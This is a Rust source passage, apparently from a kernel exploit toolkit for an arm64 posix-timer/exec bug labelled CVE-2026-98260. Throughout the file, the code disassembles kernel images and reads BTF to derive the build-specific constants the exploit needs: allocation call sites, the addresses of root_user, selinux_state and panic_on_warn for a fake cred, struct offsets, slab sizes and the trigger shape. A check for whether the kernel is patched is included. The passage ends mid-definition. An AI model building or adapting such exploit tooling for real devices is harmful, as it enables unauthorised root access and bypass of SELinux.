// SPDX-License-Identifier: Apache-2.0

//! CVE-2026-98260 per-build derivation.
//!
//! Everything the exploit hardcodes is recomputed here from a `boot.img` /
//! arm64 `Image`:
//!
//! * the two tracepoint call sites (`do_timer_create+0x94`,
//!   `copy_process`'s `task_struct_cachep` allocation) that `timer.c` matches
//!   with `& 0x1fffff`,
//! * the six link-time data symbols copied into the fake cred,
//! * the BTF struct layout / slab sizes behind `OFF_TASK_CRED`, `CRED_REQ`,
//!   `CRED_ALLOC`, `TIMER_ALLOC`, `TASK_ALLOC_BYTES`,
//! * whether the vulnerable exec/posix-timer ordering
//!   (`begin_new_exec()` cleans the timerqueue only after the fallible
//!   operations) is still present.

use std::collections::{BTreeMap, HashMap};
use std::path::Path;
use std::sync::LazyLock;

use regex::Regex;

use crate::boot::BootImage;
use crate::btf::Btf;
use crate::disasm::disassemble_range;
use crate::error::{ExtractError, Result};
use crate::facts::{self, CredLayout, RuntimeFacts, Source, Template};
use crate::ikconfig;
use crate::kallsyms::{self, Kallsyms};
use crate::kallsyms_finder;

/// `timer.c` masks the leaked trace call site with `& 0x1fffff`.
pub const LOW21_MASK: u64 = 0x1f_ffff;
/// arm64 GKI data cache line: SLUB rounds `SLAB_HWCACHE_ALIGN` caches to it
/// (`cred_jar` in kernel/cred.c, `task_struct_cachep` in kernel/fork.c).
pub const CACHE_LINE: u64 = 64;
/// Upper bound for one disassembled range, matching `disasm`'s own cap.
const MAX_FUNC: u64 = 0x20_000;

/// Function bodies whose behaviour decides exploitability.
const TIMER_CLEANUP_CALLS: &[&str] = &[
    "posix_cpu_timers_exit",
    "exit_itimers",
    "flush_itimer_signals",
];
/// The operations that may fail between `de_thread()` and the timer cleanup.
/// `exec_mmap` returning `-EINTR` is one of the failure points; 5.10 keeps the
/// other three inlined, so `exec_mmap` is that family's only visible anchor.
const FALLIBLE_CALLS: &[&str] = &[
    "unshare_files",
    "set_mm_exe_file",
    "exec_mmap",
    "exec_task_namespaces",
];
/// Reported in the call order but neither cleanup nor fallible.
const CONTEXT_CALLS: &[&str] = &["de_thread"];

/// `timer.c` macro name -> kernel data symbol.
const DATA_SYMBOLS: &[(&str, &str)] = &[
    ("SELINUX_STATE_STATIC", "selinux_state"),
    ("PANIC_ON_WARN_STATIC", "panic_on_warn"),
    ("ROOT_USER_STATIC", "root_user"),
    ("INIT_USER_NS_STATIC", "init_user_ns"),
    ("INIT_UCOUNTS_STATIC", "init_ucounts"),
    ("INIT_GROUPS_STATIC", "init_groups"),
];

// ---------------------------------------------------------------------------
// instruction text helpers
// ---------------------------------------------------------------------------

static RE_BL: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^bl\s+0x([0-9a-f]+)$").unwrap());

static RE_UNCOND_B: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^b\s+0x([0-9a-f]+)$").unwrap());

static RE_CBZ: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)^(cbz|cbnz)\s+(x\d+|w\d+),\s*0x([0-9a-f]+)$").unwrap()
});

static RE_LDAR: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)^ldar\s+x(\d+),\s*\[x\d+(?:,\s*#0x[0-9a-f]+)?\]$").unwrap()
});

static RE_ADRP: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^adrp\s+x(\d+),\s*0x([0-9a-f]+)$").unwrap());

static RE_LDR_X: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"(?i)^ldr\s+x(\d+),\s*\[x(\d+)(?:,\s*#(0x[0-9a-f]+))?\]$").unwrap()
});

static RE_ADD_X: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^add\s+x(\d+),\s*x(\d+),\s*#(0x[0-9a-f]+)$").unwrap());

static RE_MOV_X: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)^mov\s+x(\d+),\s*x(\d+)$").unwrap());

/// Hex literal from an instruction operand or a `#define`, with or without
/// the `0x` prefix that the individual capture groups may or may not keep.
fn hex(text: &str) -> Option<u64> {
    let trimmed = text.trim();
    let digits = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
        .unwrap_or(trimmed);
    if digits.is_empty() {
        return None;
    }
    u64::from_str_radix(digits, 16).ok()
}

/// A disassembled range: `lines[i]` sits at `start + 4*i` (arm64 is fixed width).
pub struct Code {
    pub start: u64,
    pub lines: Vec<String>,
}

impl Code {
    pub fn addr(&self, index: usize) -> u64 {
        self.start + index as u64 * 4
    }

    pub fn index_of(&self, addr: u64) -> Option<usize> {
        if addr < self.start || addr >= self.addr(self.lines.len()) || (addr - self.start) % 4 != 0
        {
            return None;
        }
        Some(((addr - self.start) / 4) as usize)
    }

    pub fn end(&self) -> u64 {
        self.addr(self.lines.len())
    }

    /// `bl` targets in program order, as `(index, target)`.
    pub fn calls(&self) -> Vec<(usize, u64)> {
        let mut out = Vec::new();
        for (index, line) in self.lines.iter().enumerate() {
            if let Some(caps) = RE_BL.captures(line) {
                if let Some(target) = hex(&caps[1]) {
                    out.push((index, target));
                }
            }
        }
        out
    }

    fn call_target(&self, index: usize) -> Option<u64> {
        RE_BL
            .captures(&self.lines[index])
            .and_then(|caps| hex(&caps[1]))
    }
}

pub fn disassemble_function(kernel: &[u8], start: u64, end: u64) -> Result<Code> {
    let stop = end.min(start.saturating_add(MAX_FUNC));
    if stop <= start {
        return Err(ExtractError::new(format!(
            "function at 0x{start:x} has no extent (next symbol 0x{end:x})"
        )));
    }
    let lines = disassemble_range(kernel, start as usize, stop as usize)?;
    if lines.is_empty() {
        return Err(ExtractError::new(format!("no instructions at 0x{start:x}")));
    }
    Ok(Code { start, lines })
}

// ---------------------------------------------------------------------------
// symbols
// ---------------------------------------------------------------------------

/// Link-time symbols rebased onto `_text`, so every address we derive is a
/// file offset inside the uncompressed Image and can be turned back into a
/// runtime address with `text_base + offset`.
pub struct Symbols {
    text_base: u64,
    table: BTreeMap<String, u64>,
    sorted: Vec<u64>,
}

impl Symbols {
    pub fn new(ks: &Kallsyms) -> Result<Self> {
        let text_base = kallsyms::unique(&ks.symbols, "_text")
            .ok_or_else(|| ExtractError::new("kallsyms has no unique _text"))?;
        let mut table = BTreeMap::new();
        for (name, values) in &ks.symbols {
            if values.len() == 1 {
                table.insert(
                    name.clone(),
                    (*values.iter().next().unwrap()).wrapping_sub(text_base),
                );
            }
        }
        let mut sorted: Vec<u64> = table.values().copied().collect();
        sorted.sort_unstable();
        sorted.dedup();
        Ok(Self {
            text_base,
            table,
            sorted,
        })
    }

    pub fn text_base(&self) -> u64 {
        self.text_base
    }

    pub fn rel(&self, name: &str) -> Option<u64> {
        if let Some(rel) = self.table.get(name) {
            return Some(*rel);
        }
        // LTO builds internalise static functions as `<name>.llvm.<hash>`
        // (the -mi 6.1.138 image's posix_cpu_timer_del). Accept exactly one
        // such clone; two candidates are ambiguous and stay unresolved.
        let prefix = format!("{name}.llvm.");
        let mut found: Option<u64> = None;
        for (candidate, rel) in self.table.range(prefix.clone()..) {
            if !candidate.starts_with(&prefix) {
                break;
            }
            if found.is_some() {
                return None;
            }
            found = Some(*rel);
        }
        found
    }

    pub fn require(&self, name: &str) -> Result<u64> {
        self.rel(name)
            .ok_or_else(|| ExtractError::new(format!("kallsyms has no unique symbol {name}")))
    }

    pub fn abs(&self, rel: u64) -> u64 {
        self.text_base.wrapping_add(rel)
    }

    /// End of the symbol's extent: the next symbol, capped at `MAX_FUNC`.
    pub fn extent(&self, rel: u64) -> u64 {
        let next = self
            .sorted
            .iter()
            .copied()
            .find(|&candidate| candidate > rel)
            .unwrap_or(rel + MAX_FUNC);
        next.min(rel.saturating_add(MAX_FUNC))
    }
}

// ---------------------------------------------------------------------------
// tracepoint call sites
// ---------------------------------------------------------------------------

/// Locate `kmem_cache_alloc*(cachep, ...)` inside one function and return the
/// recorded call site (`bl` address + 4).
///
/// The kernel loads the cache pointer, sets the gfp argument, then calls the
/// allocator; we track `adrp`/`add`/`ldr` to recognise the exact cache and take
/// the next `bl` as the allocation.
pub fn find_cache_alloc_site(code: &Code, cachep: u64, alloc_fns: &[u64]) -> Option<u64> {
    let mut adrp: HashMap<u8, u64> = HashMap::new();
    let mut loaded: HashMap<u8, u64> = HashMap::new();
    let mut pending: Option<u8> = None;

    for (index, line) in code.lines.iter().enumerate() {
        if let Some(caps) = RE_ADRP.captures(line) {
            let reg: u8 = caps[1].parse().ok()?;
            // A fresh `adrp` overwrites the register; an earlier `add`-derived
            // address for the same register must not shadow it (6.12.23 reuses
            // x8 between the timer-type table and `posix_timers_cache`).
            if pending == Some(reg) {
                pending = None;
            }
            loaded.remove(&reg);
            adrp.insert(reg, hex(&caps[2])?);
            continue;
        }
        if let Some(caps) = RE_ADD_X.captures(line) {
            let dst: u8 = caps[1].parse().ok()?;
            let src: u8 = caps[2].parse().ok()?;
            if pending == Some(dst) {
                pending = None;
            }
            let base = loaded.get(&src).or_else(|| adrp.get(&src)).copied();
            match base {
                Some(base) => {
                    loaded.insert(dst, base + hex(&caps[3])?);
                }
                None => {
                    loaded.remove(&dst);
                    adrp.remove(&dst);
                }
            }
            continue;
        }
        if let Some(caps) = RE_LDR_X.captures(line) {
            let dst: u8 = caps[1].parse().ok()?;
            let src: u8 = caps[2].parse().ok()?;
            let imm = caps.get(3).and_then(|m| hex(m.as_str())).unwrap_or(0);
            // The load replaces the destination register's contents: an
            // earlier cache-pointer match on it is stale unless this load
            // reloads the same cache.
            if pending == Some(dst) {
                pending = None;
            }
            if let Some(base) = loaded.get(&src).or_else(|| adrp.get(&src)).copied() {
                let value = base + imm;
                if value == cachep {
                    pending = Some(dst);
                }
            }
            loaded.remove(&dst);
            adrp.remove(&dst);
            continue;
        }
        if let Some(caps) = RE_MOV_X.captures(line) {
            // 5.10's dup_task_struct loads the cache into x8 and moves it to
            // x0 just before the call; follow the move.
            let dst: u8 = caps[1].parse().ok()?;
            let src: u8 = caps[2].parse().ok()?;
            if pending == Some(src) {
                pending = Some(dst);
            } else if pending == Some(dst) {
                pending = None;
            }
            continue;
        }
        if let Some(target) = code.call_target(index) {
            if pending.is_some() {
                // The cache pointer is the allocator's first argument.
                if pending == Some(0) && alloc_fns.contains(&target) {
                    return Some(code.addr(index) + 4);
                }
                pending = None;
            }
        }
    }
    None
}

// ---------------------------------------------------------------------------
// vulnerability checks
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct ExecOrder {
    /// Calls to the tracked functions, in program order.
    pub calls: Vec<(String, u64)>,
    /// True when the POSIX timer cleanup runs before the first fallible step.
    pub cleanup_first: bool,
    /// False when either the cleanup or the fallible step could not be located.
    pub known: bool,
}

/// Fixed kernels clean the timerqueue right after `de_thread()`
/// (upstream commit acb03d388181, stable d9ae467e617c); vulnerable kernels do
/// it after `exec_task_namespaces()`.
pub fn check_exec_timer_order(code: &Code, syms: &Symbols) -> ExecOrder {
    let mut tracked: HashMap<u64, String> = HashMap::new();
    for name in TIMER_CLEANUP_CALLS
        .iter()
        .chain(FALLIBLE_CALLS)
        .chain(CONTEXT_CALLS)
    {
        if let Some(rel) = syms.rel(name) {
            tracked.insert(rel, (*name).to_string());
        }
    }
    let mut calls = Vec::new();
    for (index, target) in code.calls() {
        if let Some(name) = tracked.get(&target) {
            calls.push((name.clone(), code.addr(index)));
        }
    }
    let cleanup = calls
        .iter()
        .position(|(name, _)| TIMER_CLEANUP_CALLS.contains(&name.as_str()));
    let fallible = calls
        .iter()
        .position(|(name, _)| FALLIBLE_CALLS.contains(&name.as_str()));
    let known = cleanup.is_some() && fallible.is_some();
    let cleanup_first = match (cleanup, fallible) {
        (Some(cleanup), Some(fallible)) => cleanup < fallible,
        _ => false,
    };
    ExecOrder {
        calls,
        cleanup_first,
        known,
    }
}

#[derive(Debug, Clone)]
pub struct TimerDelCheck {
    /// `pid_task()` returning NULL leaves the node queued when this is true.
    pub leaves_node_queued: bool,
    /// Target of the NULL branch taken after `pid_task()`.
    pub null_path: u64,
    /// Whether that path dequeues the timer node.
    pub dequeues: bool,
}

/// `posix_cpu_timer_del()`: on `pid_task() == NULL` the vulnerable code jumps
/// straight to the `put_pid()` exit, leaving `cpu_timer.node` linked.
///
/// The check accepts both compiler shapes: an out-of-line `bl pid_task`
/// followed by the NULL test (6.1/6.12), and the inlined form where the
/// task list head is read with `ldar` and immediately null-tested (5.10).
/// The dequeue may itself be inlined (`timerqueue_del` -> `rb_erase`).
pub fn check_posix_cpu_timer_del(
    code: &Code,
    pid_task: Option<u64>,
    dequeue_calls: &[Option<u64>],
    unlock: Option<u64>,
) -> Option<TimerDelCheck> {
    let null_path = match pid_task.and_then(|pid_task| {
        code.calls()
            .into_iter()
            .find(|&(_, target)| target == pid_task)
    }) {
        Some((call_index, _)) => branch_target(code, call_index + 1)?,
        None => inlined_null_path(code)?,
    };

    let mut index = code.index_of(null_path)?;
    let mut hops = 0;
    let mut dequeues = false;
    while index < code.lines.len() {
        if let Some(target) = code.call_target(index) {
            if dequeue_calls.iter().any(|call| *call == Some(target)) {
                dequeues = true;
                break;
            }
            if Some(target) == unlock {
                break;
            }
        } else if code.lines[index].starts_with("ret") {
            break;
        } else if let Some(caps) = RE_UNCOND_B.captures(&code.lines[index]) {
            hops += 1;
            if hops > 8 {
                break;
            }
            index = hex(&caps[1]).and_then(|addr| code.index_of(addr))?;
            continue;
        }
        index += 1;
    }
    Some(TimerDelCheck {
        leaves_node_queued: !dequeues,
        null_path,
        dequeues,
    })
}

/// The target of the conditional branch at `index` (NULL-side), or the
/// fall-through instruction when the branch tests "not NULL".
fn branch_target(code: &Code, index: usize) -> Option<u64> {
    let caps = RE_CBZ.captures(code.lines.get(index)?)?;
    let target = hex(&caps[3])?;
    Some(if caps[1].eq_ignore_ascii_case("cbz") {
        target
    } else {
        code.addr(index + 1)
    })
}

// ---------------------------------------------------------------------------
// exec trigger shape
// ---------------------------------------------------------------------------

/// How `exec_mmap()` can be made to fail after `de_thread()`.
///
/// The SIGKILL trigger needs the executable's mmap read lock to be killable:
/// 6.1+ takes `mmap_read_lock_killable(old_mm)`, so a pending fatal signal
/// returns `-EINTR`. 5.10/5.15 take the non-killable lock and only fail when
/// the old mm is being dumped (`old_mm->core_state != NULL`).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TriggerShape {
    /// `down_read_killable` / `mmap_read_lock_killable` in `exec_mmap`.
    Killable,
    /// Non-killable read lock plus the `old_mm->core_state` test.
    CoreState,
    /// No recognised read-lock shape (fail closed; not a silent default).
    Unknown,
}

impl TriggerShape {
    pub fn as_str(self) -> &'static str {
        match self {
            TriggerShape::Killable => "killable",
            TriggerShape::CoreState => "core_state",
            TriggerShape::Unknown => "unknown",
        }
    }
}

#[derive(Debug, Clone)]
pub struct TriggerCheck {
    pub shape: TriggerShape,
    /// Where the evidence was looked for: `exec_mmap`, or `begin_new_exec`
    /// when the compiler inlined `exec_mmap` into its caller.
    pub function: String,
    /// The read-lock call that was found: symbol name and call site.
    pub lock_call: Option<(String, u64)>,
    /// The `core_state` test's load instruction, when the shape is CoreState.
    pub core_state_test: Option<u64>,
}

/// Classify `exec_mmap`'s read-lock shape from the image.
///
/// Prefers the out-of-line `exec_mmap`; when the symbol is absent (a compiler
/// that inlined it, common on 6.6/6.12) the same shape is looked for inside
/// `begin_new_exec`. Never guesses: no evidence is `Unknown`.
pub fn check_trigger_shape(kernel: &[u8], syms: &Symbols) -> TriggerCheck {
    for function in ["exec_mmap", "begin_new_exec"] {
        let Some(start) = syms.rel(function) else {
            continue;
        };
        let Ok(code) = disassemble_function(kernel, start, syms.extent(start)) else {
            continue;
        };
        if let Some(check) = trigger_in(&code, syms, function) {
            return check;
        }
        if function == "exec_mmap" {
            // Out of line: begin_new_exec does not carry the inlined shape,
            // so the answer is genuinely unknown for this image.
            return TriggerCheck {
                shape: TriggerShape::Unknown,
                function: function.to_string(),
                lock_call: None,
                core_state_test: None,
            };
        }
    }
    TriggerCheck {
        shape: TriggerShape::Unknown,
        function: "none".to_string(),
        lock_call: None,
        core_state_test: None,
    }
}

fn trigger_in(code: &Code, syms: &Symbols, function: &str) -> Option<TriggerCheck> {
    let killable: Vec<(&str, u64)> = ["down_read_killable", "mmap_read_lock_killable"]
        .iter()
        .filter_map(|name| syms.rel(name).map(|rel| (*name, rel)))
        .collect();
    let plain: Vec<(&str, u64)> = [
        "__down_read",
        "down_read",
        "mmap_read_lock",
        "rwsem_down_read_slowpath",
    ]
    .iter()
    .filter_map(|name| syms.rel(name).map(|rel| (*name, rel)))
    .collect();
    let calls = code.calls();
    if let Some((index, target)) = calls
        .iter()
        .find(|(_, target)| killable.iter().any(|(_, rel)| rel == target))
    {
        let name = killable
            .iter()
            .find(|(_, rel)| rel == target)
            .map(|(name, _)| (*name).to_string())
            .unwrap_or_default();
        return Some(TriggerCheck {
            shape: TriggerShape::Killable,
            function: function.to_string(),
            lock_call: Some((name, code.addr(*index))),
            core_state_test: None,
        });
    }
    for (index, target) in calls {
        let Some((name, _)) = plain.iter().find(|(_, rel)| *rel == target) else {
            continue;
        };
        // The core_state test follows the read lock before the next call.
        let limit = (index + 16).min(code.lines.len());
        for cursor in index + 1..limit {
            if code.call_target(cursor).is_some() {
                break;
            }
            if let Some(test) = ldr_branch_pair(code, cursor) {
                return Some(TriggerCheck {
                    shape: TriggerShape::CoreState,
                    function: function.to_string(),
                    lock_call: Some(((*name).to_string(), code.addr(index))),
                    core_state_test: Some(test),
                });
            }
        }
        return Some(TriggerCheck {
            shape: TriggerShape::Unknown,
            function: function.to_string(),
            lock_call: Some(((*name).to_string(), code.addr(index))),
            core_state_test: None,
        });
    }
    None
}

/// An `ldr xT, [..]` followed within two instructions by a `cbz/cbnz xT`
/// test, whose target leads to the function's `-EINTR` exit on the
/// `core_state` shape. 5.10 tests it immediately; 5.15 puts one `add`
/// between the load and the branch.
fn ldr_branch_pair(code: &Code, index: usize) -> Option<u64> {
    let load = RE_LDR_X.captures(code.lines.get(index)?)?;
    let reg = format!("x{}", &load[1]);
    for ahead in 1..=2 {
        let Some(branch) = RE_CBZ.captures(code.lines.get(index + ahead)?) else {
            continue;
        };
        if branch[2].trim() == reg {
            return Some(code.addr(index));
        }
        return None;
    }
    None
}

/// The `pid_task()` NULL path when the call is inlined: the RCU task-list
/// head load (`ldar`) is followed immediately by the NULL test. Takes the
/// first such pair inside `posix_cpu_timer_del`.
fn inlined_null_path(code: &Code) -> Option<u64> {
    for index in 0..code.lines.len().saturating_sub(1) {
        let Some(load) = RE_LDAR.captures(&code.lines[index]) else {
            continue;
        };
        let Some(branch) = RE_CBZ.captures(&code.lines[index + 1]) else {
            continue;
        };
        if branch[2].trim() != format!("x{}", &load[1]) {
            continue;
        }
        return branch_target(code, index + 1);
    }
    None
}

// ---------------------------------------------------------------------------
// layout / sizes
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy)]
pub struct Layout {
    pub task_cred: u32,
    pub cred_uid: u32,
    pub sizeof_task: u32,
    pub sizeof_cred: u32,
    pub sizeof_kitimer: u32,
}

#[derive(Debug, Clone, Copy)]
pub struct Sizes {
    /// `posix_timers_cache`: `k_itimer` size, no `SLAB_HWCACHE_ALIGN`.
    pub timer_alloc: u64,
    /// `cred_jar`: requested size (`sizeof(struct cred)`).
    pub cred_req: u64,
    /// `cred_jar`: SLUB size, rounded to the data cache line.
    pub cred_alloc: u64,
    /// `task_struct_cachep`: requested size (`sizeof(struct task_struct)`).
    pub task_bytes: u64,
}

fn align_up(value: u64, align: u64) -> u64 {
    if align == 0 {
        return value;
    }
    value.div_ceil(align) * align
}

/// SLUB size of `SLAB_HWCACHE_ALIGN` caches on arm64 GKI.
pub fn hwcache_size(size: u64) -> u64 {
    align_up(size, CACHE_LINE)
}

/// Size of a cache built without `SLAB_HWCACHE_ALIGN` (word alignment).
pub fn plain_cache_size(size: u64) -> u64 {
    align_up(size, 8)
}

// ---------------------------------------------------------------------------
// derived facts
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy)]
pub struct TraceSites {
    pub timer_site: u64,
    pub copy_process_site: u64,
}

impl TraceSites {
    pub fn timer_low21(self) -> u64 {
        self.timer_site & LOW21_MASK
    }

    pub fn copy_process_low21(self) -> u64 {
        self.copy_process_site & LOW21_MASK
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    /// Root cause present; the shipped binary runs only if every constant matches.
    Vulnerable,
    /// Upstream fix (`posixtimer_exec` right after `de_thread`) is present.
    Patched,
    /// A check could not be performed; never reported as `patched`.
    Unknown(String),
}

/// Which layout source `analyze` may use, in preference order.
#[derive(Debug, Clone, Default)]
pub struct Options {
    /// Run only the two vulnerability checks (no sites, no data, no layout).
    pub detect_only: bool,
    /// Derive sites/data/checks, but no struct layout.
    pub no_layout: bool,
    /// Labelled no-BTF template name (`5.10`).
    pub layout_template: Option<String>,
    /// Explicit `field=value` layout overrides.
    pub overrides: BTreeMap<String, u64>,
    /// Runtime facts (the QEMU/device fact file).
    pub runtime: Option<RuntimeFacts>,
}

#[derive(Debug)]
pub struct Facts {
    pub release: Option<String>,
    pub text_base: u64,
    pub sites: TraceSites,
    /// Macro name -> absolute link-time address.
    pub data_symbols: BTreeMap<String, u64>,
    pub layout: Layout,
    pub sizes: Sizes,
    pub order: ExecOrder,
    pub del: TimerDelCheck,
    pub verdict: Verdict,
}

/// Everything the analysis could establish, with the source of each profile
/// field. Missing fields are recorded, not fatal — the verdict decides.
#[derive(Debug)]
pub struct Analysis {
    pub release: Option<String>,
    pub text_base: Option<u64>,
    pub symbol_count: usize,
    pub has_btf: bool,
    pub has_ikconfig: bool,
    pub config: BTreeMap<String, String>,
    pub sites: Option<TraceSites>,
    /// Macro name -> absolute link-time address; `None` when the symbol is absent.
    pub data_symbols: BTreeMap<String, Option<u64>>,
    pub layout: Option<Layout>,
    pub cred: Option<CredLayout>,
    pub sizes: Option<Sizes>,
    pub timer_node_off: Option<u64>,
    pub trace_gfp_off: Option<u32>,
    pub trace_gfp_size: Option<u32>,
    /// Per profile field: where its value came from.
    pub sources: BTreeMap<String, Source>,
    /// Per profile field: the runtime check that agreed with it.
    pub corroborated: BTreeMap<String, Source>,
    pub order: Option<ExecOrder>,
    pub del: Option<TimerDelCheck>,
    /// How `exec_mmap()` can be failed (the SIGKILL trigger's prerequisite).
    pub trigger: Option<TriggerCheck>,
    pub verdict: Verdict,
    pub runtime: Option<RuntimeFacts>,
    /// Required profile fields that could not be derived (from any source).
    pub missing: Vec<String>,
    pub warnings: Vec<String>,
    pub notes: Vec<String>,
}

impl Analysis {
    pub fn site(&self, field: &str) -> Option<u64> {
        let sites = self.sites?;
        match field {
            "timer_site" => Some(sites.timer_site),
            "copy_process_site" => Some(sites.copy_process_site),
            "timer_site_lower_21bit" => Some(sites.timer_low21()),
            "task_alloc_site_lower_21bit" => Some(sites.copy_process_low21()),
            "static_timer_site" => self.text_base.map(|base| base.wrapping_add(sites.timer_site)),
            _ => None,
        }
    }

    pub fn source(&self, field: &str) -> Option<Source> {
        self.sources.get(field).copied()
    }

    /// A profile field is `derived` when every required field has a source.
    pub fn is_derived(&self) -> bool {
        self.missing.is_empty()
    }

    /// Fields the real-path block needs; fills `missing`.
    pub fn check_real_path(&self) -> Vec<String> {
        let mut missing = Vec::new();
        for field in [
            "timer_site_lower_21bit",
            "timer_object_size",
            "cred_request_size",
            "cred_alloc_size",
            "cred_uid_offset",
            "trace.gfp_offset",
            "trace.gfp_size",
        ] {
            if !self.has_value(field) {
                missing.push(field.to_string());
            }
        }
        missing
    }

    /// Fields the fake-path block additionally needs.
    pub fn check_fake_path(&self) -> Vec<String> {
        let mut missing = self.check_real_path();
        for field in [
            "static_timer_site",
            "task_alloc_site_lower_21bit",
            "task_alloc_size",
            "task_cred_offset",
            "selinux_state",
            "panic_on_warn",
            "root_user",
            "init_user_ns",
            "init_groups",
            "cred_caps_offset",
            "cred_security_offset",
        ] {
            if !self.has_value(field) {
                missing.push(field.to_string());
            }
        }
        if self.cred.is_some_and(|cred| cred.ucounts_offset.is_some()) && !self.has_value("init_ucounts")
        {
            missing.push("init_ucounts".to_string());
        }
        missing
    }

    fn has_value(&self, field: &str) -> bool {
        if self.sites.is_some() {
            match field {
                "timer_site_lower_21bit" | "task_alloc_site_lower_21bit" | "static_timer_site" | "timer_site"
                | "copy_process_site" => return true,
                _ => {}
            }
        }
        if let Some(layout) = self.layout {
            match field {
                "cred_uid_offset" => return true,
                "task_cred_offset" => return layout.task_cred != 0,
                _ => {}
            }
        }
        if let Some(sizes) = self.sizes {
            match field {
                "timer_object_size" => return sizes.timer_alloc != 0,
                "cred_request_size" => return sizes.cred_req != 0,
                "cred_alloc_size" => return sizes.cred_alloc != 0,
                "task_alloc_size" => return sizes.task_bytes != 0,
                _ => {}
            }
        }
        if self.cred.is_some() {
            match field {
                "cred_caps_offset" => return true,
                "cred_security_offset" => return true,
                _ => {}
            }
        }
        if field == "trace.gfp_offset" {
            return self.trace_gfp_off.is_some();
        }
        if field == "trace.gfp_size" {
            return self.trace_gfp_size.is_some();
        }
        if let Some(value) = self.data_symbols.get(data_macro(field)) {
            return value.is_some();
        }
        self.sources.contains_key(field)
    }
}

/// Profile field name -> `DATA_SYMBOLS` macro name.
fn data_macro(field: &str) -> &str {
    match field {
        "selinux_state" => "SELINUX_STATE_STATIC",
        "panic_on_warn" => "PANIC_ON_WARN_STATIC",
        "root_user" => "ROOT_USER_STATIC",
        "init_user_ns" => "INIT_USER_NS_STATIC",
        "init_ucounts" => "INIT_UCOUNTS_STATIC",
        "init_groups" => "INIT_GROUPS_STATIC",
        other => other,
    }
}

fn low21_site(kernel: &[u8], syms: &Symbols, function: &str, cache_symbol: &str, alloc_fns: &[&str]) -> Option<(u64, String)> {
    let Some(function_rel) = syms.rel(function) else {
        return None;
    };
    let code = match disassemble_function(kernel, function_rel, syms.extent(function_rel)) {
        Ok(code) => code,
        Err(_) => return None,
    };
    let cache = syms.rel(cache_symbol)?;
    let fns: Vec<u64> = alloc_fns.iter().filter_map(|name| syms.rel(name)).collect();
    find_cache_alloc_site(&code, cache, &fns).map(|site| (site, function.to_string()))
}

/// The two trace sites, without the BTF layout.
fn derive_sites(
    kernel: &[u8],
    syms: &Symbols,
    notes: &mut Vec<String>,
) -> (Option<TraceSites>, BTreeMap<String, Source>) {
    let mut sources = BTreeMap::new();
    let timer = low21_site(
        kernel,
        syms,
        "do_timer_create",
        "posix_timers_cache",
        &["kmem_cache_alloc_noprof", "kmem_cache_alloc"],
    );
    let mut task = low21_site(
        kernel,
        syms,
        "copy_process",
        "task_struct_cachep",
        &[
            "kmem_cache_alloc_node_noprof",
            "kmem_cache_alloc_node",
            "kmem_cache_alloc_noprof",
            "kmem_cache_alloc",
        ],
    );
    if task.is_none() {
        // 6.1 keeps dup_task_struct() out of line: the allocation, and the
        // return address the kmem trace records, live there.
        task = low21_site(
            kernel,
            syms,
            "dup_task_struct",
            "task_struct_cachep",
            &[
                "kmem_cache_alloc_node_noprof",
                "kmem_cache_alloc_node",
                "kmem_cache_alloc_noprof",
                "kmem_cache_alloc",
            ],
        );
    }
    if timer.is_none() {
        notes.push("do_timer_create: no kmem_cache_alloc(posix_timers_cache) call".to_string());
    }
    if task.is_none() {
        notes.push("copy_process/dup_task_struct: no task_struct_cachep allocation".to_string());
    }
    match (timer, task) {
        (Some((timer_site, _)), Some((copy_process_site, _))) => {
            sources.insert("timer_site_lower_21bit".to_string(), Source::Image);
            sources.insert("task_alloc_site_lower_21bit".to_string(), Source::Image);
            sources.insert("static_timer_site".to_string(), Source::Image);
            (Some(TraceSites { timer_site, copy_process_site }), sources)
        }
        _ => (None, sources),
    }
}

/// BTF layout: struct sizes, the task/cred offsets, the cred overlay.
#[allow(clippy::type_complexity)]
fn derive_btf_layout(
    btf: &Btf,
) -> (
    Option<Layout>,
    Option<CredLayout>,
    Option<(u32, u32)>,
    BTreeMap<String, Source>,
) {
    let mut sources = BTreeMap::new();
    let trace_gfp_off = btf.field("trace_event_raw_mm_page_alloc", "gfp_flags");
    let trace_gfp_size = btf.direct_field_size("trace_event_raw_mm_page_alloc", "gfp_flags");
    let trace = match (trace_gfp_off, trace_gfp_size) {
        (Some(off), Some(size)) => {
            sources.insert("trace.gfp_offset".to_string(), Source::Btf);
            sources.insert("trace.gfp_size".to_string(), Source::Btf);
            Some((off, size))
        }
        _ => None,
    };
    let Some(sizeof_task) = btf.size("task_struct") else {
        return (None, None, trace, sources);
    };
    let Some(sizeof_cred) = btf.size("cred") else {
        return (None, None, trace, sources);
    };
    let Some(sizeof_kitimer) = btf.size("k_itimer") else {
        return (None, None, trace, sources);
    };
    let Some(task_cred) = btf.field("task_struct", "cred") else {
        return (None, None, trace, sources);
    };
    let Some(cred_uid) = btf.field("cred", "uid") else {
        return (None, None, trace, sources);
    };
    let layout = Layout {
        task_cred,
        cred_uid,
        sizeof_task,
        sizeof_cred,
        sizeof_kitimer,
    };
    for field in [
        "task_alloc_size",
        "cred_request_size",
        "cred_alloc_size",
        "timer_object_size",
        "task_cred_offset",
        "cred_uid_offset",
    ] {
        sources.insert(field.to_string(), Source::Btf);
    }

    let (Some(caps_offset), Some(security_offset), Some(user_offset), Some(group_info_offset)) = (
        btf.field("cred", "cap_inheritable"),
        btf.field("cred", "security"),
        btf.field("cred", "user"),
        btf.field("cred", "group_info"),
    ) else {
        return (Some(layout), None, trace, sources);
    };
    let usage_size = btf
        .direct_field_size("cred", "usage")
        .unwrap_or(4);
    let caps_count = if btf.field("cred", "cap_ambient").is_some() { 5 } else { 4 };
    let cred = Some(CredLayout {
        usage_size,
        caps_offset,
        caps_count,
        security_offset,
        user_offset,
